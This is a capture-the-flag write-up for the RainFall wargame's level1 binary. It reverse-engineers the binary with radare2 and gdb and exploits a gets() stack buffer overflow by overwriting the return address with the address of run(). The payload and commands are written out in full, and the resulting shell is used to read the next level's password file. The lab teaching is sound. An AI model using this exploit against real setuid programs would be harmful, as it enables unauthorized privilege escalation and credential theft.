# Level1
  
List the files will show us 'level1' executable
```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$
```
The program wait an input and quit after press enter
```
level1@RainFall:~$ ./level1
a
level1@RainFall:~$ ./level1 test
423
level1@RainFall:~$
```
Let's analyze it with radare2, the command `pxc` show hexdump with comments
```
$ r2 level1
 -- What do you want to debug today?
[0x08048390]> pxc
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
0x08048390  31ed 5e89 e183 e4f0 5054 5268 1085 0408  1.^.....PTRh....  ; eip  ; [13] -r-x section size 444 named .text
0x080483a0  68a0 8404 0851 5668 8084 0408 e8cf ffff  h....QVh........
0x080483b0  fff4 9090 9090 9090 9090 9090 9090 9090  ................
0x080483c0  5589 e553 83ec 0480 3dc4 9704 0800 753f  U..S....=.....u?  ; sym.__do_global_dtors_aux
0x080483d0  a1c8 9704 08bb b896 0408 81eb b496 0408  ................
0x080483e0  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
0x080483f0  83c0 01a3 c897 0408 ff14 85b4 9604 08a1  ................
0x08048400  c897 0408 39d8 72e8 c605 c497 0408 0183  ....9.r.........
0x08048410  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
0x08048420  5589 e583 ec18 a1bc 9604 0885 c074 12b8  U............t..  ; sym.frame_dummy
0x08048430  0000 0000 85c0 7409 c704 24bc 9604 08ff  ......t...$.....
0x08048440  d0c9 c390 5589 e583 ec18 a1c0 9704 0889  ....U...........  ; sym.run
0x08048450  c2b8 7085 0408 8954 240c c744 2408 1300  ..p....T$..D$...
0x08048460  0000 c744 2404 0100 0000 8904 24e8 defe  ...D$.......$...
0x08048470  ffff c704 2484 8504 08e8 e2fe ffff c9c3  ....$...........
0x08048480  5589 e583 e4f0 83ec 508d 4424 1089 0424  U.......P.D$...$  ; sym.main
[0x08048390]>
```
We can see that there is two principal function : `main` and `run`  
Run `aaa` command before prompt or patch to analyze all referenced code. This step is necessary before decompile both functions :
```
[0x08048390]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048390]>
```
Now we can decompile both functions with side assembly with the command `pdda`.  
*The `s` command in radare2 is used to "seek" to a spot in memory*
```
[0x08048390]> s sym.run
[0x08048444]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level1 @ 0x8048444 */
                                                 | #include <stdint.h>
                                                 |
    ; (fcn) sym.run ()                           | int32_t run (void) {
                                                 |     size_t size;
                                                 |     size_t nitems;
                                                 |     FILE * stream;
    0x08048444 push ebp                          |
    0x08048445 mov ebp, esp                      |     
    0x08048447 sub esp, 0x18                     |
    0x0804844a mov eax, dword [0x80497c0]        |     eax = stdout;
    0x0804844f mov edx, eax                      |     edx = stdout;
    0x08048451 mov eax, 0x8048570                |     eax = "Good... Wait what?\n";
    0x08048456 mov dword [esp + 0xc], edx        |     *((esp + 0xc)) = edx;
    0x0804845a mov dword [esp + 8], 0x13         |     *((esp + 8)) = 0x13;
    0x08048462 mov dword [esp + 4], 1            |     *((esp + 4)) = 1;
    0x0804846a mov dword [esp], eax              |
    0x0804846d call 0x8048350                    |     fwrite (ebp);
    0x08048472 mov dword [esp], 0x8048584        |
    0x08048479 call 0x8048360                    |     system ("/bin/sh");
    0x0804847e leave                             |
    0x0804847f ret                               |     return eax;
                                                 | }
[0x08048444]>
```
This function use `fwrite` to display "Good... Wait what?\n" in the standard output stream (stdout).  
Then execute the shell command `/bin/sh` using `system`. 
```
[0x08048444]> s main
[0x08048480]> pdda
    ; assembly                               | /* r2dec pseudo code output */
                                             | /* level1 @ 0x8048480 */
                                             | #include <stdint.h>
                                             |
    ; (fcn) main ()                          | int32_t main (void) {
                                             |     char * s;
    0x08048480 push ebp                      |
    0x08048481 mov ebp, esp                  |
    0x08048483 and esp, 0xfffffff0           |
    0x08048486 sub esp, 0x50                 |
    0x08048489 lea eax, [esp + 0x10]         |     eax = esp + 0x10;
    0x0804848d mov dword [esp], eax          |
    0x08048490 call 0x8048340                |     gets (eax);
    0x08048495 leave                         |
    0x08048496 ret                           |     return eax;
                                             | }
[0x08048480]>
```
The `main` function uses gets to receive user input who is vunerable to buffer overflow exploit.  
The `main` function uses an unprotected `gets()` that will allow us to perform a buffer overflow attack.  
  
By overwriting the RET value with the address of run() we can force its execution.  
```
    0x08048486 sub esp, 0x50                 |
```
The `main` also have a buffer of 0x50 (80), let's test with a buffer this length
```
level1@RainFall:~$ python -c 'print "a" * 80' > /tmp/exploit
level1@RainFall:~$ gdb ./level1 
(gdb) r < /tmp/exploit
Starting program: /home/user/level1/level1 < /tmp/exploit

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb)
```
There is a segfault because access to the address 0x61616161 is not authorized. This address corresponds to the last 4 bytes characters, this is the address of the EIP register.  
Instead of characters 'a', we will overwrite the return address by passing the adress of the `run()` function : 0x08048444 (reversed for little-endian).
```
level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
```
But as we need to execute this through a pipe, `/bin/sh` is non-interactive and will automatically shutdown because it will try to read stdin and will see EOF. It exits, because that's what programs that get EOF on input are supposed to do.  
We have a little trick with cat to keep stdin open, so `/bin/sh` will keep listening to stdin and execute whatever is sent through it.  
*[Open a shell from a pipelined process](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process) *
```
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
pwd
/home/user/level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$ su level2
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$
```
Level1 passed!
